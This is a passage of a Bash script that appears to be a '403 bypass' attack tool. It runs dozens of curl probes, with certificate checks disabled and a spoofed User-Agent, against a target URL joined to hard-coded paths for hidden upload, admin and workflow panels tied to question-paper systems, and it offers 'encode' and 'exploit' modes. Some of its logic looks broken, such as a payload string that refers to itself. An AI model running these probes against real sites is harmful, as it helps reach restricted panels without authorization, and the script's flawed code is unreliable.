payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print


}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
